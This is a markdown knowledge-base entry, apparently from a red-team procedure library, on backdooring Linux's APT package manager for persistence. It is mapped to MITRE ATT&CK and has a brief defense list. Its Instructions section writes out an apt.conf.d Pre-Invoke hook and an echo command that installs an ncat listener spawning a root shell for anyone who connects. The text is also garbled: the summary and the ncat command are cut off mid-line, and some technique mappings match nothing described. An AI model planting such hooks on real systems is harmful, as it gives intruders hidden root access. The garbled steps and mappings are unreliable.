---
id: d283689e-6075-40e1-90fb-308e6f4b1f21
name: Linux APT Backdoor Persistence
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:18.119448+00:00'
updated_at: '2023-04-10T20:34:19.255510+00:00'
tactics:
- '[[Command and Control|TA0011 - Command and Control]]'
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Discovery|TA0007 - Discovery]]'
- '[[Persistence|TA0003 - Persistence]]'
techniques:
- '[[Indicator Removal on Host|T1070 - Indicator Removal on Host]]'
- '[[Modify Existing Service|T1031 - Modify Existing Service]]'
- '[[Standard Application Layer Protocol|T1071 - Standard Application Layer Protocol]]'
- '[[Virtualization/Sandbox Evasion|T1497 - Virtualization/Sandbox Evasion]]'
tags:
- '[[Backdooring the APT]]'
- '[[Linux - Persistence]]'
---

# Linux APT Backdoor Persistence

## Summary

Linux APT Backdoor Persistence is a technique used to maintain access to a compromised Linux system by backdooring the APT package manager. The attacker first executes a command to update the APT package manager, then creates a backdoor which allows the attacker to execute arbitrary commands as the

## Description

# Description

Linux APT Backdoor Persistence is a technique used to maintain access to a compromised Linux system by backdooring the APT package manager. The attacker first executes a command to update the APT package manager, then creates a backdoor which allows the attacker to execute arbitrary commands as the root user. This technique allows the attacker to maintain access to the system even if the initial access vector is discovered and remediated. 

Technical Explanation: The attacker modifies the APT configuration file to include a malicious repository that contains a backdoored version of a legitimate package. When the system updates its packages, it installs the backdoored package, which creates a reverse shell that allows the attacker to execute commands as the root user. 

Business Value: This technique allows an attacker to maintain persistent access to a compromised Linux system, which can be used to steal sensitive data, install additional malware, or launch further attacks against the organization.

## Requirements

1. Access to a compromised Linux system

1. Knowledge of APT package manager configuration

1. Privileged access to modify APT configuration file

## Defense

1. Monitor APT configuration files for unauthorized modifications

1. Use package integrity verification tools to detect backdoored packages

1. Limit privileges of users and applications to prevent modification of APT configuration files

## Objectives

1. Maintain persistent access to a compromised Linux system

1. Execute arbitrary commands as the root user

# Instructions

1. To execute a command before APT update, you can create a file in the /etc/apt/apt.conf.d/ directory with the name starting with a number, followed by the command to be executed. For example, 10mycommand:

**Code**: [[APT::Update::Pre-Invoke {&quot;CMD&quot;};]]

> This command allows you to execute a command before running an APT update. You can create a file in the /etc/apt/apt.conf.d/ directory with a name starting with a number followed by the command to be executed. This command can be used to perform tasks like updating package lists or cleaning up old packages before running an APT update.

2. This command creates a backdoor in the APT package manager. When executed, it will listen on port 1234 and spawn a shell for anyone who connects to it.

**Code**: [[echo 'APT::Update::Pre-Invoke {"nohup ncat -lvp 12]]

> The command uses the 'echo' command to write a configuration file to the '/etc/apt/apt.conf.d/' directory. The configuration file sets a 'Pre-Invoke' command for the APT package manager. This command will be executed before any package updates are performed. The command that is set will listen on port 1234 using 'ncat' and spawn a shell for anyone who connects to it. The 'nohup' command is used to ensure that the command continues to run even if the user who executed it logs out. The '2> /dev/null' redirects any error messages to the null device to prevent them from being displayed.

## MITRE ATT&CK Mapping

### Tactics

- [[Command and Control|TA0011 - Command and Control]]
- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Discovery|TA0007 - Discovery]]
- [[Persistence|TA0003 - Persistence]]

### Techniques

- [[Indicator Removal on Host|T1070 - Indicator Removal on Host]]
- [[Modify Existing Service|T1031 - Modify Existing Service]]
- [[Standard Application Layer Protocol|T1071 - Standard Application Layer Protocol]]
- [[Virtualization/Sandbox Evasion|T1497 - Virtualization/Sandbox Evasion]]

## Tags

- [[Backdooring the APT]]
- [[Linux - Persistence]]
